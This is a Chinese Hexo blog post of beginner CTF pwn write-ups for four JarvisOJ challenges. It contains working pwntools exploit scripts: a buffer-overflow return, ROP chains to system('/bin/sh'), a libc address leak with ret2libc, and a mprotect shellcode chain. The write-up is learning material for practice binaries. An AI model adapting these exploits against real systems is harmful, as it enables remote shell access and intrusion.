@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="二进制安全,pwn," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="wyx's blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="Linux-x64  JarvisOJ-Pwn-level0  JarvisOJ-Pwn-level2_x64  JarvisOJ-Pwn-level3_x64  JarvisOJ-Pwn-level5">
+<meta name="keywords" content="二进制安全,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【pwn】入门笔记2">
+<meta property="og:url" content="http://yoursite.com/入门笔记2/index.html">
+<meta property="og:site_name" content="wyx&#39;s blog">
+<meta property="og:description" content="Linux-x64  JarvisOJ-Pwn-level0  JarvisOJ-Pwn-level2_x64  JarvisOJ-Pwn-level3_x64  JarvisOJ-Pwn-level5">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-09-05T13:03:36.988Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【pwn】入门笔记2">
+<meta name="twitter:description" content="Linux-x64  JarvisOJ-Pwn-level0  JarvisOJ-Pwn-level2_x64  JarvisOJ-Pwn-level3_x64  JarvisOJ-Pwn-level5">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/入门笔记2/"/>
+
+
+
+
+
+  <title>【pwn】入门笔记2 | wyx's blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">wyx's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/入门笔记2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wyx">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wyx's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【pwn】入门笔记2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-06T16:21:29+08:00">
+                2018-08-06
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-09-05T21:03:36+08:00">
+                2018-09-05
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Linux-x64"><a href="#Linux-x64" class="headerlink" title="Linux-x64"></a>Linux-x64</h1><ul>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level0</li>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level2_x64</li>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level3_x64</li>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level5</li>
+</ul>
+<a id="more"></a>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
+<p>待施工</p>
+</blockquote>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="JarvisOJ-level0"><a href="#JarvisOJ-level0" class="headerlink" title="JarvisOJ level0"></a>JarvisOJ level0</h3><pre><code>发现callsystem函数，函数地址为0x400596，对应的小端序为：\x96\x05\x40\x00；于是可以构造payload=0x88*‘a&apos; + “\x96\x05\x40\x00”，于是用pwntools编写攻击代码
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9881'</span>)</span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + <span class="string">"\x96\x05\x40\x00"</span></span><br><span class="line"><span class="comment">#addr  = p64(0x400596)</span></span><br><span class="line"><span class="comment">#payload = 0x88*'a'</span></span><br><span class="line"><span class="comment">#payload = payload+addr</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="JarvisOJ-level2-x64"><a href="#JarvisOJ-level2-x64" class="headerlink" title="JarvisOJ level2_x64"></a>JarvisOJ level2_x64</h3><pre><code>由于x64并不直接由栈传参，而是通过寄存器，所以这道题目和x86最大的不同在于要找到pop rdi; ret这个gadget，首先通过ROPgadget查找pop rdi; ret。
+</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/wyx/JarvisOJ-pwn-level2_x64$ ROPgadget --binary level2_x64 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b2 : pop r15 ; ret</span><br><span class="line">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400560 : pop rbp ; ret</span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br><span class="line">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004a1 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>
+<pre><code>可以看到pop rdi; ret的地址为0x00000000004006b3，所以编写exp.py函数如下
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)</span><br><span class="line">level2 = ELF(<span class="string">'level2_x64'</span>)</span><br><span class="line">system_addr = level2.plt[<span class="string">'system'</span>]</span><br><span class="line">pr_addr = <span class="number">0x4006b3</span></span><br><span class="line">binsh_addr = <span class="number">0x600A90</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pr_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="JarvisOJ-level3-x64"><a href="#JarvisOJ-level3-x64" class="headerlink" title="JarvisOJ level3_x64"></a>JarvisOJ level3_x64</h3><pre><code>没有找到pop rsi; pop rdi; pop rdx; ret的gadgets，就用一个pop rsi; ret和一个pop rdi; pop r15; ret
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9883</span>)</span><br><span class="line">level3 = ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x4005E6</span></span><br><span class="line">plt_write = level3.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write = level3.got[<span class="string">'write'</span>]</span><br><span class="line">pdr_addr = <span class="number">0x4006b3</span></span><br><span class="line">psr_addr = <span class="number">0x4006b1</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pdr_addr) + p64(<span class="number">1</span>) + p64(psr_addr) + p64(got_write) + p64(<span class="number">0</span>) + p64(plt_write) + p64(vulfun_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">libc_system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">libc_sh = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_addr = write_addr - libc_write + libc_system</span><br><span class="line">sh_addr = write_addr - libc_write + libc_sh</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span> +p64(pdr_addr) + p64(sh_addr) + p64(system_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="JarvisOJ-level5"><a href="#JarvisOJ-level5" class="headerlink" title="JarvisOJ level5"></a>JarvisOJ level5</h3><pre><code>由于mmap需要的参数过多，很难找到符合条件的gadgets。参考其他大佬的做法是，先将shellcode写到.bss段，然后用函数mprotect修改.bss段的权限，使其可执行。由此，基本思路是，首先泄露内存地址，然后调用read(0,bss_addr,0x100)将shellcode写入.bss段，然后调用mprotect(0x600000,0x1000,7)修改.bss段的权限，最后执行shellcode即可。
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9884</span>)</span><br><span class="line"><span class="comment">#p = process('./level3_x64')</span></span><br><span class="line">level5 = ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x4005E6</span></span><br><span class="line">plt_write = level5.plt[<span class="string">'write'</span>]</span><br><span class="line">plt_read = level5.plt[<span class="string">'read'</span>]</span><br><span class="line">got_write = level5.got[<span class="string">'write'</span>]</span><br><span class="line">pdr_addr = <span class="number">0x4006b3</span></span><br><span class="line">psr_addr = <span class="number">0x4006b1</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pdr_addr) + p64(<span class="number">1</span>) + p64(psr_addr) + p64(got_write) + p64(<span class="number">0</span>) + p64(plt_write) + p64(vulfun_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_mprotect = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">mprotect_addr = write_addr - libc_write + libc_mprotect</span><br><span class="line">pxr_addr = write_addr -libc_write + <span class="number">0x1b8e</span></span><br><span class="line">bss_addr = level5.bss()</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pdr_addr) + p64(<span class="number">0</span>) + p64(psr_addr) +p64(bss_addr) + p64(<span class="number">0</span>) + p64(plt_read) + p64(vulfun_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pdr_addr) + p64(<span class="number">0x600000</span>) + p64(psr_addr) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0</span>) + p64(pxr_addr) + p64(<span class="number">7</span>) + p64(mprotect_addr) + p64(bss_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>在上述实现代码中，构造gadget的时候，首先通过pop rdi,ret和pop rsi,pop r15,ret泄露地址，然后得到libc的基质，然后通过libc中的pop rdx,ret传递第三个参数，执行mprotect()。除此之外，还可以通过__libc_csu_init中的代码构造gadget，可利用的代码部分如下
+</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400690 &lt;+64&gt;:	mov    rdx,r13</span><br><span class="line">0x0000000000400693 &lt;+67&gt;:	mov    rsi,r14</span><br><span class="line">0x0000000000400696 &lt;+70&gt;:	mov    edi,r15d</span><br><span class="line">0x0000000000400699 &lt;+73&gt;:	call   QWORD PTR [r12+rbx*8]</span><br><span class="line">0x000000000040069d &lt;+77&gt;:	add    rbx,0x1</span><br><span class="line">0x00000000004006a1 &lt;+81&gt;:	cmp    rbx,rbp</span><br><span class="line">0x00000000004006a4 &lt;+84&gt;:	jne    0x400690 &lt;__libc_csu_init+64&gt;</span><br><span class="line">0x00000000004006a6 &lt;+86&gt;:	add    rsp,0x8</span><br><span class="line">0x00000000004006aa &lt;+90&gt;:	pop    rbx</span><br><span class="line">0x00000000004006ab &lt;+91&gt;:	pop    rbp</span><br><span class="line">0x00000000004006ac &lt;+92&gt;:	pop    r12</span><br><span class="line">0x00000000004006ae &lt;+94&gt;:	pop    r13</span><br><span class="line">0x00000000004006b0 &lt;+96&gt;:	pop    r14</span><br><span class="line">0x00000000004006b2 &lt;+98&gt;:	pop    r15</span><br><span class="line">0x00000000004006b4 &lt;+100&gt;:	ret</span><br></pre></td></tr></table></figure>
+<pre><code>首先调用0x00000000004006aa处的gadget，再调用0x0000000000400690处的gadget。由此可以实现对rdi、rsi、rdx三个寄存器赋值，并且跳转到r12+rbx*8处执行。实现代码如下
+</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/二进制安全-pwn/" rel="tag"># 二进制安全,pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018-8/" rel="next" title="2018/8">
+                <i class="fa fa-chevron-left"></i> 2018/8
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/未分类题集/" rel="prev" title="未分类题集">
+                未分类题集 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/header.jpg"
+               alt="wyx" />
+          <p class="site-author-name" itemprop="name">wyx</p>
+           
+              <p class="site-description motion-element" itemprop="description">Something cruel, someone ideal.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://csuwangj.github.io/" title="望将" target="_blank">望将</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.lhaihai.wang/" title="Lhaihai" target="_blank">Lhaihai</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cnblogs.com/0xJDchen/" title="JDChen" target="_blank">JDChen</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-x64"><span class="nav-text">Linux-x64</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level0"><span class="nav-text">JarvisOJ level0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level2-x64"><span class="nav-text">JarvisOJ level2_x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level3-x64"><span class="nav-text">JarvisOJ level3_x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level5"><span class="nav-text">JarvisOJ level5</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wyx</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Gemini
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
